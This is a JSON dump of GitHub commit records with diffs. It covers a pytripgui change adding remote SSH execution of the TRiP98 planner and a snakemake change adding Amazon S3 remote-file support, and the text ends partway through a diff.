self.viewcanvases=None self.patient_tree=None self.settings=None self.settings=SettingsModel(self) class SettingsModel(object): \"\"\" This class contains a list model parameters which need to be retained when closing PyTRiPGUI. The attribute names must be identical to those in Model. Model attribute names with leading _ are saved, but not loaded. Model attribute names with leading __ are not saved and not loaded. \"\"\" def __init__(self, model): \"\"\" This object is pickled upon save and unpickled upon load. It is connected to Model, in a way that -upon SettingsController.load(), SettingsModel attributes starting with \"_\" are not written to Model. -upon SettingsController.save(), Model attributes starting with \"__\" are not written to SettingsModel. This way, a) _version is written to disk, but imported into Model when loading b) __internal_attribute__ are not passed between Model and SettingsModel \"\"\" self.trip_config=model.trip_config self.kernels=model.kernels self._pytrip_version=model._pytrip_version self._pytripgui_version=model._pytripgui_version ","sourceWithComments":"import logging\n\nfrom pytripgui.plan_executor.trip_config import Trip98ConfigModel\n\nlogger = logging.getLogger(__name__)\n\n\nclass MainModel(object):\n    def __init__(self):\n\n        from pytrip import __version__ as _pytrip_version\n        from pytripgui import __version__ as _pytripgui_version\n\n        self._pytrip_version = _pytrip_version\n        self._pytripgui_version = _pytripgui_version\n\n        self.trip_config = Trip98ConfigModel()\n        self.kernels = []  # placeholder for KernelModels\n\n        self.viewcanvases = None\n        self.patient_tree = None\n        self.settings = None\n\n        self.settings = SettingsModel(self)\n\n\nclass SettingsModel(object):\n    \"\"\"\n    This class contains a list model parameters which need to be retained when closing PyTRiPGUI.\n    The attribute names must be identical to those in Model.\n    Model attribute names with leading _ are saved, but not loaded.\n    Model attribute names with leading __ are not saved and not loaded.\n    \"\"\"\n\n    def __init__(self, model):\n        \"\"\"\n        This object is pickled upon save and unpickled upon load.\n        It is connected to Model, in a way that\n        - upon SettingsController.load(), SettingsModel attributes starting with \"_\"  are not written to         Model.\n        - upon SettingsController.save(),         Model attributes starting with \"__\" are not written to SettingsModel.\n\n        This way,\n            a) _version is written to disk, but imported into Model when loading\n            b) __internal_attribute__ are not passed between Model and SettingsModel\n        \"\"\"\n        self.trip_config = model.trip_config\n\n        self.kernels = model.kernels\n\n        self._pytrip_version = model._pytrip_version  # saved, but not loaded\n        self._pytripgui_version = model._pytripgui_version  # saved, but not loaded\n"},"\/pytripgui\/plan_executor\/executor.py":{"changes":[{"diff":"\n         plan.hlut_path = self.trip_config.hlut_path\n \n         te = pte.Execute(patient.ctx, patient.vdx)\n-        te.trip_bin_path = os.path.join(self.trip_config.trip_path, 'TRiP98')\n+        if self.trip_config.remote_execution:\n+            te.remote = True\n+            te.servername = self.trip_config.host_name\n+            te.username = self.trip_config.user_name\n+            te.password = self.trip_config.password\n+            print(self.trip_config.pkey_path)\n+            te.pkey_path = self.trip_config.pkey_path\n+            te.remote_base_dir = self.trip_config.wdir_remote_path + '\/'\n+\n+        te.trip_bin_path = self.trip_config.trip_path + '\/' + 'TRiP98'\n+\n         if self.listener:\n             te.add_log_listener(self.listener)\n \n         try:\n             te.execute(plan)\n-        except RuntimeError:\n-            logger.error(\"TRiP98 executer: Runtime error\")\n+        except BaseException as e:\n+            self.listener.write(e.__str__())\n+            logger.error(e.__str__())\n             exit(-1)\n \n         results = SimulationResults(patient, p","add":14,"remove":3,"filename":"\/pytripgui\/plan_executor\/executor.py","badparts":["        te.trip_bin_path = os.path.join(self.trip_config.trip_path, 'TRiP98')","        except RuntimeError:","            logger.error(\"TRiP98 executer: Runtime error\")"],"goodparts":["        if self.trip_config.remote_execution:","            te.remote = True","            te.servername = self.trip_config.host_name","            te.username = self.trip_config.user_name","            te.password = self.trip_config.password","            print(self.trip_config.pkey_path)","            te.pkey_path = self.trip_config.pkey_path","            te.remote_base_dir = self.trip_config.wdir_remote_path + '\/'","        te.trip_bin_path = self.trip_config.trip_path + '\/' + 'TRiP98'","        except BaseException as e:","            self.listener.write(e.__str__())","            logger.error(e.__str__())"]},{"diff":"\n         plan.hlut_path = self.trip_config.hlut_path\n \n         te = pte.Execute(patient.ctx, patient.vdx)\n-        te.trip_bin_path = os.path.join(self.trip_config.trip_path, 'TRiP98')\n+        if self.trip_config.remote_execution:\n+            te.remote = True\n+            te.servername = self.trip_config.host_name\n+            te.username = self.trip_config.user_name\n+            te.password = self.trip_config.password\n+            print(self.trip_config.pkey_path)\n+            te.pkey_path = self.trip_config.pkey_path\n+            te.remote_base_dir = self.trip_config.wdir_remote_path + '\/'\n+\n+        te.trip_bin_path = self.trip_config.trip_path + '\/' + 'TRiP98'\n+\n         if self.listener:\n             te.add_log_listener(self.listener)\n \n         try:\n             te.execute(plan)\n-        except RuntimeError:\n-            logger.error(\"TRiP98 executer: Runtime error\")\n+        except BaseException as e:\n+            self.listener.write(e.__str__())\n+            logger.error(e.__str__())\n             exit(-1)\n \n         results = SimulationResults(patient, p","add":14,"remove":3,"filename":"\/pytripgui\/plan_executor\/executor.py","badparts":["        te.trip_bin_path = os.path.join(self.trip_config.trip_path, 'TRiP98')","        except RuntimeError:","            logger.error(\"TRiP98 executer: Runtime error\")"],"goodparts":["        if self.trip_config.remote_execution:","            te.remote = True","            te.servername = self.trip_config.host_name","            te.username = self.trip_config.user_name","            te.password = self.trip_config.password","            print(self.trip_config.pkey_path)","            te.pkey_path = self.trip_config.pkey_path","            te.remote_base_dir = self.trip_config.wdir_remote_path + '\/'","        te.trip_bin_path = self.trip_config.trip_path + '\/' + 'TRiP98'","        except BaseException as e:","            self.listener.write(e.__str__())","            logger.error(e.__str__())"]}],"source":"\nimport os import copy import logging import pytrip.tripexecuter as pte from pytripgui.plan_executor.simulation_results import SimulationResults logger=logging.getLogger(__name__) class PlanExecutor: def __init__(self, trip_config, listener=None): self.trip_config=trip_config self.listener=listener def check_config(self): if self.trip_config.wdir_path==\"\": return -1 if self.trip_config.trip_path==\"\": return -1 return 0 def execute(self, patient, plan): plan=copy.deepcopy(plan) plan.working_dir=self.trip_config.wdir_path plan.dedx_path=self.trip_config.dedx_path plan.hlut_path=self.trip_config.hlut_path te=pte.Execute(patient.ctx, patient.vdx) te.trip_bin_path=os.path.join(self.trip_config.trip_path, 'TRiP98') if self.listener: te.add_log_listener(self.listener) try: te.execute(plan) except RuntimeError: logger.error(\"TRiP98 executer: Runtime error\") exit(-1) results=SimulationResults(patient, plan) return results ","sourceWithComments":"import os\nimport copy\nimport logging\n\nimport pytrip.tripexecuter as pte\nfrom pytripgui.plan_executor.simulation_results import SimulationResults\n\nlogger = logging.getLogger(__name__)\n\n\nclass PlanExecutor:\n    def __init__(self, trip_config, listener=None):\n        self.trip_config = trip_config\n        self.listener = listener\n\n    def check_config(self):\n        # TODO replace with function that actually runs trip, and collect returned errors\n        if self.trip_config.wdir_path == \"\":\n            return -1\n        if self.trip_config.trip_path == \"\":\n            return -1\n        return 0\n\n    def execute(self, patient, plan):\n        plan = copy.deepcopy(plan)\n\n        plan.working_dir = self.trip_config.wdir_path\n        plan.dedx_path = self.trip_config.dedx_path\n        plan.hlut_path = self.trip_config.hlut_path\n\n        te = pte.Execute(patient.ctx, patient.vdx)\n        te.trip_bin_path = os.path.join(self.trip_config.trip_path, 'TRiP98')\n        if self.listener:\n            te.add_log_listener(self.listener)\n\n        try:\n            te.execute(plan)\n        except RuntimeError:\n            logger.error(\"TRiP98 executer: Runtime error\")\n            exit(-1)\n\n        results = SimulationResults(patient, plan)\n\n        return results\n"},"\/pytripgui\/plan_executor\/trip_config.py":{"changes":[{"diff":"\n class Trip98ConfigModel:\n     def __init__(self):\n-        self.wdir_path = \"\"\n-        self.trip_path = \"\"\n+        self.name = \"\"\n+        self.remote_execution = False\n         self.hlut_path = \"\"\n         self.dedx_path = \"\"\n+        self.wdir_path = \"\"\n+        self.trip_path = \"\"\n+\n+        # remote execution\n+        self.host_name = \"\"\n+        self.user_name = \"\"\n+        self.pkey_path = \"\"\n+        self.password = \"\"\n+        self.wdir_remote_path","add":11,"remove":2,"filename":"\/pytripgui\/plan_executor\/trip_config.py","badparts":["        self.wdir_path = \"\"","        self.trip_path = \"\""],"goodparts":["        self.name = \"\"","        self.remote_execution = False","        self.wdir_path = \"\"","        self.trip_path = \"\"","        self.host_name = \"\"","        self.user_name = \"\"","        self.pkey_path = \"\"","        self.password = \"\"","        self.wdir_remote_path"]},{"diff":"\n class Trip98ConfigModel:\n     def __init__(self):\n-        self.wdir_path = \"\"\n-        self.trip_path = \"\"\n+        self.name = \"\"\n+        self.remote_execution = False\n         self.hlut_path = \"\"\n         self.dedx_path = \"\"\n+        self.wdir_path = \"\"\n+        self.trip_path = \"\"\n+\n+        # remote execution\n+        self.host_name = \"\"\n+        self.user_name = \"\"\n+        self.pkey_path = \"\"\n+        self.password = \"\"\n+        self.wdir_remote_path","add":11,"remove":2,"filename":"\/pytripgui\/plan_executor\/trip_config.py","badparts":["        self.wdir_path = \"\"","        self.trip_path = \"\""],"goodparts":["        self.name = \"\"","        self.remote_execution = False","        self.wdir_path = \"\"","        self.trip_path = \"\"","        self.host_name = \"\"","        self.user_name = \"\"","        self.pkey_path = \"\"","        self.password = \"\"","        self.wdir_remote_path"]}],"source":"\nclass Trip98ConfigModel: def __init__(self): self.wdir_path=\"\" self.trip_path=\"\" self.hlut_path=\"\" self.dedx_path=\"\" ","sourceWithComments":"class Trip98ConfigModel:\n    def __init__(self):\n        self.wdir_path = \"\"\n        self.trip_path = \"\"\n        self.hlut_path = \"\"\n        self.dedx_path = \"\"\n"}},"msg":"WIP: Feature\/234 execute trip remotely (#357)\n\n* initial\r\n\r\n* Adding \"hostname, username, pass\" to tripconfig\r\n\r\n* Enchance trip_config fields\r\n\r\n* Mark ui as private\r\n\r\n* Hardcoded execution of first config on trip config list works\r\n\r\n* simple test repair\r\n\r\n* Remove debug print\r\n\r\n* Cleaning code\r\n\r\n* Format code with yapf\r\n\r\n* Selecting trip config\r\n\r\n* Format code with yapf\r\n\r\n* Replace hardcoded path\r\n\r\n* Repairs \"IndexError: list index out of range\" mentioned in Merge Request\r\n\r\n* Format code with yapf\r\n\r\n* If list is empty, then you cannot save settings\r\n\r\n* Disable unimplemented features\r\n\r\n* 1. Logging with private key works (pass protected and not)\r\n2. Add \"Remote\/Local\" Path info\r\n3. Add Remote TRIP path\r\n4. Shows errors more verbosely to user\r\n\r\n* remove test script used for development\r\n\r\n* Format code with yapf\r\n\r\n* fix: problem with paths\r\n\r\nCo-authored-by: ljelen <lukasz.jelen@ifj.edu.pl>\r\nCo-authored-by: deepsource-autofix[bot] <62050782+deepsource-autofix[bot]@users.noreply.github.com>"}},"https:\/\/github.com\/kdaily\/snakemake":{"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d":{"url":"https:\/\/api.github.com\/repos\/kdaily\/snakemake\/commits\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","html_url":"https:\/\/github.com\/kdaily\/snakemake\/commit\/7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","message":"Initial commit with support for remote files.\n\nThis introduces changes that scratch an itch within our research group for remote file support, and I hope the new functionality will be useful for others as well.\n\nWhat is it all about? Wouldn't it be wonderful if you would use Snakemake with remote data stored on Amazon S3? Imagine being able to read and write the same files as your collaborators without rsyncing files back and forth or using pricey network-attached storage. Want to output and store 1PB of small files? Want to let someone else worry about durability? Want to work with large files locally that you can store individually but that are too large in aggregate? The support for remote storage introduced with these changes will allow you do all of these things! Remote storage is initially intended to work with AWS S3 and things sporting a similar API, though it is flexible enough that would could extended it to support other remote providers. It expect you to already have an S3 bucket setup, and API credentials for it permitting read\/write access.\n\nHere's how you use it:\n\nThe `Snakefile` now supports a wrapper function, `remote()`, indicating a file is on a remote storage provider (this is similar to `temp()` or `protected()`). During rule execution, the file (or object) specified, is downloaded to the `cwd`, within a sub-directory bearing the same name as the bucket. This lets you have multiple remote origins with reduced likelihood of name collisions, and allows snakemake to easily translate remote objects to local file paths. The `remote()` wrapper is mutually-exclusive with the `temp()` and `protected()` wrappers.\n\nThe implementation of all communication with the remote storage provider is specified in a class passed as a keyword argument to the remote wrapper. This class defines methods related to being a RemoteObject(). By default, the S3 provider is used and it does not need to be specified explicitly. If you are interested in creating a custom remote storage provider for whatever system you are using, implement the methods defined in the abstract base class `snakemake.remote_providers.RemoteObjectProvider`. Take a look at the S3 provider for an example implementation. To use a custom remote storage provider implementation (FTP, etc.), import it within your `Snakefile`, and set the `provider` keyword argument, as is being done with S3 below:\n\n    import snakemake.remote_providers.S3 as S3\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3)\n\nSince S3 is the default remote storage provider, it can be omitted from the `Snakefile`:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\")\n\nAdditional kwargs can be passed to the remote provider this way to set credentials, should you not want to rely on whichever credentials happen to be stored in the environment variables (suggestion: if using multiple buckets with different credentials, read in the key and secret within your `Snakefile` and pass as appropriate to the `remote()` wrappers). For the S3 provider, the additional kwargs are passed straight through to the boto `connect_s3()` method, so refer to the [boto docs](https:\/\/boto.readthedocs.org\/en\/latest\/ref\/s3.html#boto.s3.connection.S3Connection) to see the available parameters:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"aws_access_key_id\":\"myKey\", \"aws_secret_access_key\":\"mySecret\"})\n\nThis can also be used to specify a custom URL to connect to rather than AWS, for a different service offering an S3-like API:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/file.txt\", provider=S3, additional_kwargs={\"host\":\"mystorageapi.example.com\"})\n\nFor any storage backend with an API deviating significantly from that of S3, it may make sense to create a new remote provider.\n\nExpand still works as expected, just wrap the expansion:\n\n    rule all:\n        input:\n            remote(expand(\"bucket-name\/{letter}-2.txt\", letter=[\"A\", \"B\", \"C\"]), provider=S3)\n\nOnly remote files needed to satisfy the DAG build are downloaded for the workflow.  By default, remote files downloaded prior to rule execution and are removed locally as soon as no rules depend on them. Remote files can be explicitly kept by setting the `keep=True` keyword argument:\n\n    rule all:\n        input: remote('bucket-name\/prefix{split_id}.txt', keep=True)\n\nIf you wish to have a rule to simply download a file to a local copy, you can do so by declaring the same file path locally as is used by the remote file:\n\n    rule all:\n        input:\n            remote(\"bucket-name\/out.txt\")\n        output:\n            \"bucket-name\/out.txt\"\n        run:\n            shell(\"cp {output[0]} .\/\")\n\nHere's a brief summary of the changes. I tried to minimize the impact on existing code, relying where possible on external classes, new functions, and the use of decorators to connect them.\n\nWithin `io.py`, the usage of flags has been extended to store not just boolean values, but also objects. This is how, for example, the remote provider is passed to the `_IOFile()` object.\n\nSeveral methods of `_IOFile()` now bear a decorator \"@_referToRemote\". When called, this decorator ensures that for files flagged as `remote()`, the methods defined in the class for the remote provider are used rather than the local equivalents specified within the `_IOFile()` class of `io.py`.\n\nThe `dag.py` file has been updated to have a `handle_remote()` method that is responsible for handling remote files after job execution. It uploads files that are not remote, and removes local files flagged as remote when they are no longer needed (exception: if the `\"keep=True\"` argument is provided to `remote()`).\n\nA `decorators.py` file has been added for general-purpose decorators. Currently in use is `@decAllMethods`, which is a class decorator that applies a specified decorator to all methods of a decorated class. This is used with in the `test_remote\/` unit test to help mock out methods of `RemoteObject()`.\n\nTwo new exceptions have been added, `RemoteFileException()` and `S3FileException()`. These could probably be used more.\n\nThe `jobs.py` file has been changed to add methods related to assessing remote files for a given job. It also has two new functions used in `dag.py` `handle_remote()` to delete remote-containing directories when they are empty after purging local copies of remote files. It also adds `expanded_input()`, which is used in `handle_remote()` to help determine which wildcard\/dynamic files should be removed after job execution. The function `expanded_input()` would benefit from a critical eye.\n\nThe `rules.py` file has a small change causing newly expanded `_IOFile`s to clone the flags of their unexpanded sources. There's probably a better way.\n\nThe `workflow.py` file has been modified to import the new `glob_wildcards_remote()` helper function from `io.py`. This function is the remote analog to `glob_wildcards()`, but it needs to know the remote provider (S3 is default).\n\nA unit test has been added, `test_remote\/`. This is similar in nature to the function `test_cluster_dynamic\/`. For testing, the `moto` package is used to mock out boto, so that remote file tests do not need to hit the live S3 API.\n\nThese changes have the following dependencies (as represented in setup.py):\n* boto>=2.38.0 (for making AWS\/S3 API calls)\n* filechunkio>=1.6 (for file chunking prior to multipart upload, avoiding wheel reinvention)\n* moto>=0.4.14 (for mocking up local S3 \"buckets\" for unit testing)\n\nThis is a first pass at support for remote storage support, and feedback is welcome. The intent was to add remote file support while make minimal changes to existing Snakemake logic.","sha":"7ddb8ae8e900d19aa609ca8b97ba5f44b7844e4d","keyword":"remote code execution protect","diff":"diff --git a\/setup.py b\/setup.py\nindex dfea1dd..97f4d86 100644\n--- a\/setup.py\n+++ b\/setup.py\n@@ -59,6 +59,7 @@ def run_tests(self):\n     },\n     package_data={'': ['*.css', '*.sh', '*.html']},\n     tests_require=['nose>=1.3'],\n+    install_requires=['boto>=2.38.0','filechunkio>=1.6', 'moto>=0.4.14'],\n     cmdclass={'test': NoseTestCommand},\n     classifiers=\n     [\"Development Status :: 5 - Production\/Stable\", \"Environment :: Console\",\ndiff --git a\/snakemake\/dag.py b\/snakemake\/dag.py\nindex f1ead14..e591550 100644\n--- a\/snakemake\/dag.py\n+++ b\/snakemake\/dag.py\n@@ -10,7 +10,7 @@\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n@@ -288,6 +288,51 @@ def unneeded_files():\n             logger.info(\"Removing temporary output file {}.\".format(f))\n             f.remove()\n \n+    def handle_remote(self, job):\n+        \"\"\" Remove local files if they are no longer needed, and upload to S3. \"\"\"\n+        \n+        needed = lambda job_, f: any(\n+            f in files for j, files in self.depending[job_].items()\n+            if not self.finished(j) and self.needrun(j) and j != job)\n+\n+        remote_files = set([f for f in job.expanded_input if f.is_remote]) | set([f for f in job.expanded_output if f.is_remote])\n+        local_files = set([f for f in job.input if not f.is_remote]) | set([f for f in job.expanded_output if not f.is_remote])\n+        files_to_keep = set(f for f in remote_files if is_flagged(f, \"keep\"))\n+\n+        # remove local files from list of remote files\n+        # in case the same file is specified in both places\n+        remote_files -= local_files\n+        remote_files -= files_to_keep\n+\n+        def unneeded_files():\n+            for job_, files in self.dependencies[job].items():\n+                for f in (remote_files & files):\n+                    if not needed(job_, f) and not f.protected:\n+                        yield f\n+            for f in filterfalse(partial(needed, job), [f for f in remote_files]):\n+                if not f in self.targetfiles and not f.protected:\n+                    yield f\n+\n+        def expanded_dynamic_depending_input_files():\n+            for j in self.depending[job]:    \n+                for f in j.expanded_input:\n+                    yield f\n+\n+        unneededFiles = set(unneeded_files())\n+        unneededFiles -= set(expanded_dynamic_depending_input_files())\n+\n+        for f in [f for f in job.expanded_output if f.is_remote]:\n+            if not f.exists_remote:\n+                logger.info(\"Uploading local output file to remote: {}\".format(f))\n+                f.upload_to_remote()\n+\n+        for f in set(unneededFiles):\n+            logger.info(\"Removing local output file: {}\".format(f))\n+            f.remove()\n+\n+        job.rmdir_empty_remote_dirs()\n+\n+\n     def jobid(self, job):\n         if job not in self._jobid:\n             self._jobid[job] = len(self._jobid)\ndiff --git a\/snakemake\/decorators.py b\/snakemake\/decorators.py\nnew file mode 100644\nindex 0000000..063ddde\n--- \/dev\/null\n+++ b\/snakemake\/decorators.py\n@@ -0,0 +1,31 @@\n+__author__ = \"Christopher Tomkins-Tinch\"\n+__copyright__ = \"Copyright 2015, Christopher Tomkins-Tinch\"\n+__email__ = \"tomkinsc@broadinstitute.org\"\n+__license__ = \"MIT\"\n+\n+import functools\n+import inspect\n+\n+\n+def memoize(obj):\n+    cache = obj.cache = {}\n+\n+    @functools.wraps(obj)\n+    def memoizer(*args, **kwargs):\n+        key = str(args) + str(kwargs)\n+        if key not in cache:\n+            cache[key] = obj(*args, **kwargs)\n+        return cache[key]\n+\n+    return memoizer\n+\n+\n+def decAllMethods(decorator, prefix='test_'):\n+\n+    def decClass(cls):\n+        for name, m in inspect.getmembers(cls, inspect.isfunction):\n+            if prefix == None or name.startswith(prefix):\n+                setattr(cls, name, decorator(m))\n+        return cls\n+\n+    return decClass\ndiff --git a\/snakemake\/exceptions.py b\/snakemake\/exceptions.py\nindex d606c99..7440442 100644\n--- a\/snakemake\/exceptions.py\n+++ b\/snakemake\/exceptions.py\n@@ -281,6 +281,13 @@ class IOFileException(RuleException):\n     def __init__(self, msg, lineno=None, snakefile=None):\n         super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n+class RemoteFileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n+\n+class S3FileException(RuleException):\n+    def __init__(self, msg, lineno=None, snakefile=None):\n+        super().__init__(msg, lineno=lineno, snakefile=snakefile)\n \n class ClusterJobException(RuleException):\n     def __init__(self, job, jobid, jobscript):\ndiff --git a\/snakemake\/executors.py b\/snakemake\/executors.py\nindex 6bd0114..961e7ba 100644\n--- a\/snakemake\/executors.py\n+++ b\/snakemake\/executors.py\n@@ -109,6 +109,7 @@ def print_job_error(self, job):\n     def finish_job(self, job):\n         self.dag.handle_touch(job)\n         self.dag.check_output(job, wait=self.latency_wait)\n+        self.dag.handle_remote(job)\n         self.dag.handle_protected(job)\n         self.dag.handle_temp(job)\n \ndiff --git a\/snakemake\/io.py b\/snakemake\/io.py\nindex 0ba9cbd..3e32628 100644\n--- a\/snakemake\/io.py\n+++ b\/snakemake\/io.py\n@@ -8,11 +8,12 @@\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n@@ -45,9 +46,46 @@ def __new__(cls, file):\n         obj._file = file\n         obj.rule = None\n         obj._regex = None\n+\n         return obj\n \n+    def __init__(self, file):\n+        self._remote_object = None\n+        if self.is_remote:\n+            additional_args = get_flag_value(self._file, \"additional_remote_args\") if get_flag_value(self._file, \"additional_remote_args\") else []\n+            additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+            self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, *additional_args, **additional_kwargs)\n+        pass\n+\n+    def _referToRemote(func):\n+        \"\"\" \n+            A decorator so that if the file is remote and has a version \n+            of the same file-related function, call that version instead. \n+        \"\"\"\n+        @functools.wraps(func)\n+        def wrapper(self, *args, **kwargs):\n+            if self.is_remote:\n+                if self.remote_object:\n+                    if hasattr( self.remote_object, func.__name__):\n+                        return getattr( self.remote_object, func.__name__)(*args, **kwargs)\n+            return func(self, *args, **kwargs)\n+        return wrapper\n+\n     @property\n+    def is_remote(self):\n+        return is_flagged(self._file, \"remote\")\n+    \n+    @property\n+    def remote_object(self):\n+        if not self._remote_object:\n+            if self.is_remote:\n+               additional_kwargs = get_flag_value(self._file, \"additional_remote_kwargs\") if get_flag_value(self._file, \"additional_remote_kwargs\") else {}\n+               self._remote_object = get_flag_value(self._file, \"remote_provider\").RemoteObject(self, **additional_kwargs)\n+        return self._remote_object\n+    \n+\n+    @property\n+    @_referToRemote\n     def file(self):\n         if not self._is_function:\n             return self._file\n@@ -56,32 +94,74 @@ def file(self):\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n@@ -108,9 +188,10 @@ def protect(self):\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n@@ -136,11 +217,21 @@ def apply_wildcards(self, wildcards,\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n@@ -166,6 +257,17 @@ def match(self, target):\n     def format_dynamic(self):\n         return self.replace(self.dynamic_fill, \"{*}\")\n \n+    def clone_flags(self, other):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        if isinstance(other._file, AnnotatedString):\n+            self._file.flags = getattr(other._file, \"flags\", {})\n+\n+    def set_flags(self, flags):\n+        if isinstance(self._file, str):\n+            self._file = AnnotatedString(self._file)\n+        self._file.flags = flags\n+\n     def __eq__(self, other):\n         f = other._file if isinstance(other, _IOFile) else other\n         return self._file == f\n@@ -286,9 +388,17 @@ def flag(value, flag_type, flag_value=True):\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n@@ -297,6 +407,9 @@ def temp(value):\n     if is_flagged(value, \"protected\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n     return flag(value, \"temp\")\n \n \n@@ -310,6 +423,9 @@ def protected(value):\n     if is_flagged(value, \"temp\"):\n         raise SyntaxError(\n             \"Protected and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"remote\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n     return flag(value, \"protected\")\n \n \n@@ -318,7 +434,7 @@ def dynamic(value):\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n@@ -334,6 +450,36 @@ def dynamic(value):\n def touch(value):\n     return flag(value, \"touch\")\n \n+def remote(value, provider=S3, keep=False, additional_args=None, additional_kwargs=None):\n+\n+    additional_args = [] if not additional_args else additional_args\n+    additional_kwargs = {} if not additional_kwargs else additional_kwargs\n+\n+    if not provider:\n+        raise RemoteFileException(\"Provider (S3, etc.) must be specified for remote file as kwarg.\")\n+    if is_flagged(value, \"temp\"):\n+        raise SyntaxError(\n+            \"Remote and temporary flags are mutually exclusive.\")\n+    if is_flagged(value, \"protected\"):\n+        raise SyntaxError(\n+            \"Remote and protected flags are mutually exclusive.\")\n+    return flag(\n+                flag(\n+                    flag( \n+                        flag( \n+                            flag(value, \"remote\"), \n+                            \"remote_provider\", \n+                            provider\n+                        ), \n+                        \"additional_remote_kwargs\", \n+                        additional_kwargs\n+                    ),\n+                    \"additional_remote_args\",\n+                    additional_args\n+                ),\n+                \"keep\",\n+                keep\n+            )\n \n def expand(*args, **wildcards):\n     \"\"\"\n@@ -410,6 +556,31 @@ def glob_wildcards(pattern):\n                     getattr(wildcards, name).append(value)\n     return 